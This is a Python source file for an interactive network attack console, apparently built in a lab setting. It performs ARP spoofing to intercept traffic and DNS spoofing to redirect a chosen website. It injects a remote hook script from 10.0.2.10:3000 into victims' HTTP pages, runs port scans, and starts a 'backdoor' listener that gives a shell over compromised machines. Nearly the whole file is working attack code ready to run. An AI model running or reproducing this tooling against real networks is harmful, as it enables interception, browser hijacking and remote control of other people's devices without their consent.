#!/usr/bin/env python

import scapy.all as scapy
import re
import time
import sys
import multiprocessing
import netfilterqueue
import subprocess
import ctypes
import os
import socket

from VulnerabilityScanner import Scanner
from Listener import Listener


# function that returns a list with responses from a broadcast
def broadcast(ip):
    arp_request = scapy.ARP(pdst=ip)  # ARP object creation, asks who has target IP
    brdcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # Ethernet object creation, set destination MAC to broadcast MAC
    arp_request_broadcast = brdcast / arp_request  # Combine into a single packet

    # Send packets with custom Ether, send packet and receive response. "timeout": Time to wait for response
    return scapy.srp(arp_request_broadcast, timeout=2, retry=3, verbose=False)[0]


# function that scans network IPs
def network_scanner():
    print('[+] Capturing Local Network Address...')
    route = re.findall(r'[0-9]+(?:\.[0-9]+){3}', str(scapy.conf.route))
    network, netmask, machine_ip = route[4], route[5], route[7]
    if network and netmask:
        print('Network: {}'.format(network))
        print('Netmask: {}'.format(netmask))
        print("Machine's IP: {}".format(machine_ip))
        try:
            cidr = sum([bin(int(x)).count('1') for x in netmask.split('.')])
            scan_ip = network + '/' + str(cidr)
            print('[+] Scanning Network...')
            final = []
            for _ in range(0, 5):
                temp = [ip[1].psrc for ip in broadcast(scan_ip)]
                if len(temp) > len(final):
                    final = temp
            print('[+] Network scan complete.')
            try:
                final.remove(machine_ip)
            except ValueError:
                pass
            return final  # returns the list with the IPs
        except ValueError:
            print("[!] Something went wrong. Scan failed.")
            return
    else:
        print("[-] Could not read Network or Subnet Mask. Scan failed.")
        return


# function that returns target, source IPs from input
def ip_input(scan_list):
    trgt, src = '', ''
    print("IP Table")
    print("--------")
    for ip in scan_list:
        print(ip)
    print("--------")
    while trgt not in scan_list or src not in scan_list:
        trgt = input('\nYour target IP: ')
        src = input('Your source IP: ')
    return [trgt], src


# function that returns MAC address of selected IP
def get_mac(ip):
    answered_mac = broadcast(ip)
    try:
        return answered_mac[0][1].hwsrc
    except IndexError:
        pass


# function that spoofs IPs
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)

    # Target sees attacker's MAC address but thinks it's the router cause of the IP
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


# function that restores the communication of two devices
def restore(dst_ip, src_ip):
    dst_mac = get_mac(dst_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)  # count: number of times to send


# function that resets ARP tables and restores original connections
def cleanup(targets, src):
    for target_ip in targets:
        if target_ip != router_ip:
            restore(target_ip, src)
            restore(src, target_ip)
    print("[+] Done!")
    global allow_arp
    allow_arp = 1


# function that creates a Man in the Middle
def arp_spoof(targets, src):
    if SYS_PLATFORM == 'linux':
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write("1")  # enable ip forwarding to allow flow of packets through machine
            while True:
                for target_ip in targets:
                    if target_ip != router_ip:
                        spoof(target_ip, src)
                        spoof(src, target_ip)
                time.sleep(2)
        except Exception:
            print("[!] Something went wrong ... Resetting ARP Tables...")
            cleanup(targets, src)
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write("0")  # disable ip forwarding


# function that modifies DNS layer packets
def process_packet_dns(packet, target_website, modified_ip):
    scapy_packet = scapy.IP(packet.get_payload())  # convert payload into a scapy packet
    if scapy_packet.haslayer(scapy.DNSRR):  # check if packet has a dns response layer
        qname = scapy_packet[scapy.DNSQR].qname.decode("utf-8")
        if target_website in qname:
            # create a dns response, keep the name, change the ip to the preferred one
            answer = scapy.DNSRR(rrname=qname, rdata=modified_ip)
            scapy_packet[scapy.DNS].an = answer  # modify the answer of the packet
            scapy_packet[scapy.DNS].ancount = 1  # modify the number of answers of the packet

            # remove variables that would corrupt the modified packet, scapy will auto redefine them
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(bytes(scapy_packet))  # change the original payload of the packet with the modified one
    packet.accept()  # allow forwarding the packet to it's destination


# function that modifies HTTP layer packets
def process_packet_hook(packet):
    scapy_packet = scapy.IP(packet.get_payload())  # convert payload into a scapy packet
    if scapy_packet.haslayer(scapy.Raw):  # check if packet has a Raw layer
        load = scapy_packet[scapy.Raw].load.decode("utf-8", "ignore")
        load = load.replace("HTTP/1.1", "HTTP/1.0")
        if scapy_packet[scapy.TCP].dport == 80:  # it's a HTTP Request, dport: destination port, port for http
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)  # remove the encoding
        elif scapy_packet[scapy.TCP].sport == 80:  # it's a HTTP Response, sport: source port, port for http
            injection_code = '<script src="http://10.0.2.10:3000/hook.js"></script>'
            load = load.replace("</body>", "</body>" + injection_code)
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))

        if load != scapy_packet[scapy.Raw].load.decode("utf-8", "ignore"):
            scapy_packet[scapy.Raw].load = load
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.TCP].chksum
            packet.set_payload(bytes(scapy_packet))  # change the original payload of the packet with the modified one
    packet.accept()  # allow forwarding the packet to it's destination


# function that spoofs a DNS response
def dns_spoof(target_website, modified_ip):
    subprocess.run(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "1"])
    queue = netfilterqueue.NetfilterQueue()  # object creation
    queue.bind(1,
               lambda packet, target_website=target_website, modified_ip=modified_ip:
               process_packet_dns(packet, target_website, modified_ip)
               )  # connect to an existed queue
    try:
        queue.run()
    except Exception:
        print("[!] Something went wrong ... FlUSHING IPTABLES...")
        subprocess.run(["iptables", "--flush"])
        print("[+] Done.")
        global allow_dns
        allow_dns = 1


# function that injects a hook
def hook():
    subprocess.run(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "1"])
    queue = netfilterqueue.NetfilterQueue()  # object creation
    queue.bind(1, process_packet_hook)  # connect to an existed queue
    try:
        queue.run()
    except Exception:
        print("[!] Something went wrong ... FlUSHING IPTABLES...")
        subprocess.run(["iptables", "--flush"])
        print("[+] Done.")
        global allow_hook
        allow_hook = 1


def kill_dns():
    try:
        if dns_process.is_alive():
            dns_process.terminate()
            print("[!] Dns process terminated ... FlUSHING IPTABLES...")
            subprocess.run(["iptables", "--flush"])
            print("[+] Done.")
            global allow_dns
            allow_dns = 1
        else:
            print('[-] No dns spoof running at the moment.')
    except NameError:
        print('[-] No dns spoof running at the moment.')


def kill_hook():
    try:
        if hook_process.is_alive():
            hook_process.terminate()
            print("[!] Hook process terminated ... FlUSHING IPTABLES...")
            subprocess.run(["iptables", "--flush"])
            print("[+] Done.")
            global allow_hook
            allow_hook = 1
        else:
            print('[-] No Hook Injector running at the moment.')
    except NameError:
        print('[-] No Hook Injector running at the moment.')


def kill_arp():
    try:
        if arp_process.is_alive():
            kill_dns()
            kill_hook()
            arp_process.terminate()
            print("[!] Arp process terminated ... Resetting ARP Tables...")
            cleanup(selected, source)
            if SYS_PLATFORM == 'linux':
                with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                    f.write("0")  # disable ip forwarding
        else:
            print('[-] No arp spoof running at the moment.')
    except NameError:
        print('[-] No arp spoof running at the moment.')


def vulnscan_info():
    ignore = []
    target = input('Your target URL: ')
    decision = input('Do you want to ignore any link types[y/n]: ')
    while decision.lower() == 'y':
        ignore.append(input('Link to ignore: '))
        decision = input('Ignore another?[y/n]: ')
    scanner = Scanner(target, ignore)

    decision = input('Do you want to insert login credentials[y/n]: ')
    if decision.lower() == 'y':
        login_url = input('Login URL: ')
        username = input('Username: ')
        password = input('Password: ')
        data_dict = {"username": username, "password": password, "Login": "submit"}
        scanner.session.post(login_url, data=data_dict)
    return scanner


def port_scanner():
    port_list_tcp = []
    ip = input("Insert IP: ")
    print("[+] Scanning...")
    for port in range(1, 65536):
        try:
            socket.setdefaulttimeout(2)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            port_list_tcp.append(port)
            banner = s.recv(1024).decode('utf-8').strip("\r\n")
            s.close()
            if banner:
                print("Port: {} : {}".format(port, banner))
        except:
            pass
    return port_list_tcp


def request_dns(dns_port):
    udp = scapy.UDP(sport=my_port, dport=dns_port)
    query = ip / udp / dns

    rawsock.sendto(scapy.raw(query), (dns_ip, dns_port))
    sock.settimeout(0.0001)
    try:
        (res, addr) = sock.recvfrom(2048)
        return addr[1]
    except socket.timeout:
        pass


SYS_PLATFORM = sys.platform  # os of the current machine
command = ''  # command to be executed
allow_arp = 1  # flag that shows if an arp spoof is already running
allow_dns = 1  # flag that shows if a dns spoof is already running
allow_hook = 1  # flag that shows if a hook injector is already running
scan_result = []  # list of network IPs
tcp_ports = []  # list of open ports
router_ip = scapy.conf.route.route("0.0.0.0")[2]  # router's ip

print('Welcome back Boss!')

while True:
    print("Insert your command:")
    command = input(">> ")
    # try:
    if command == "exit":
        kill_arp()
        print("[+] Cya later Boss!")
        sys.exit()

    elif command == "scan":
        scan_result = network_scanner()

    elif command == "arpspoof":
        if allow_arp and scan_result:
            option = ''
            print('Default mode: auto. Type "man" for manual')
            option = input(">> Option: ")

            if option == 'man':
                selected = []
                selected, source = ip_input(scan_result)
            else:
                source = router_ip
                selected = scan_result

            arp_process = multiprocessing.Process(target=arp_spoof, args=(selected, source))
            print("[+] Initializing Arp Spoof...")
            arp_process.start()
            allow_arp = 0
        else:
            print('[!] Network IPs not defined or Arp spoof already running.')

    elif command == 'dnsspoof':
        if allow_dns:
            try:
                if arp_process.is_alive():
                    kill_hook()
                    target_website = input('Your target website: ')
                    modified_ip = input('Your redirect IP: ')
                    dns_process = multiprocessing.Process(target=dns_spoof, args=(target_website, modified_ip))
                    print("[+] Initializing Dns Spoof...")
                    dns_process.start()
                    allow_dns = 0
                else:
                    print('[-] No arp spoof running at the moment.')
            except NameError:
                print('[-] No arp spoof running at the moment.')
        else:
            print('[!] Dns spoof already running.')

    elif command == 'hook':
        if allow_hook:
            try:
                if arp_process.is_alive():
                    kill_dns()
                    hook_process = multiprocessing.Process(target=hook)
                    print("[+] Initializing Hook Injector...")
                    hook_process.start()
                    allow_hook = 0
                else:
                    print('[-] No arp spoof running at the moment.')
            except NameError:
                print('[-] No arp spoof running at the moment.')
        else:
            print('[!] Hook injector already running.')

    elif command == 'vulnscan':
        vuln_scanner = vulnscan_info()
        print("\n[+] Initializing Vulnerability Scanner...")
        try:
            vuln_scanner.crawl()
            vuln_scanner.run_scanner()
        except:
            print("[!] Something went wrong.")
        print("\n[+] Process finished...")

    elif command == 'backdoor':
        my_listener = Listener("10.0.2.10", 6217)  # listener for incoming connections
        service = multiprocessing.Process(target=my_listener.server)
        connections_status = multiprocessing.Process(target=my_listener.check_connections)
        service.start()
        connections_status.start()
        my_listener.shell()
        connections_status.terminate()
        service.terminate()

    elif command == 'portscan':
        tcp_ports = port_scanner()
        print("Open Ports: {}".format(str(tcp_ports).replace(' ', '')))

    elif command == 'requestdns':
        my_ip = '10.0.2.10'
        my_domain = input("Insert domain name: ")
        my_port = 5533
        dns_ip = input("Insert IP: ")

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((my_ip, my_port))

        rawsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        rawsock.setsockopt(socket.IPPROTO_IP, socket.SO_REUSEADDR, 1)

        ip = scapy.IP(src=my_ip, dst=dns_ip)
        qdsec = scapy.DNSQR(qname=my_domain, qtype="A", qclass="IN")
        dns = scapy.DNS(qr=0, opcode="QUERY", rd=1, qdcount=1, ancount=0, nscount=0, arcount=0, qd=qdsec)

        p = multiprocessing.Pool(8)
        print("Sending requests...")
        open_dns_ports = p.map(request_dns, list(range(1, 65535+1)))
        p.close()
        p.join()
        open_dns_ports = [port for port in open_dns_ports if port is not None]
        print("Open Ports: {}".format(str(open_dns_ports).replace(' ', '')))
        sock.close()
        rawsock.close()

    elif command == 'killarp':
        kill_arp()

    elif command == 'killdns':
        kill_dns()

    elif command == 'killhook':
        kill_hook()

    elif command == "help":
        print("--------------------------------------------------")
        print("COMMANDS      DESCRIPTION")
        print("--------------------------------------------------")
        print("help          Show commands")
        print("scan          Network scanning")
        print("arpspoof      Manual or Auto Arp Spoof")
        print("dnsspoof      DNS Spoof Attack")
        print("hook          Hook Injector")
        print("killarp       Kill process running Arp Spoof")
        print("killdns       Kill process running Dns Spoof")
        print("killhook      Kill process running Hook Injector")
        print("vulnscan      Vulnerability Scanner")
        print("backdoor      Control Center")
        print("portscan      Scan for open ports")
        print("requestdns    Scan for open ports on a DNS server")
        print("exit          Exit the app")
        print("--------------------------------------------------")

    else:
        print('[-] Command not found. Type help to show commands.')

    # except Exception:
    #     print('[-] Error during command execution.')
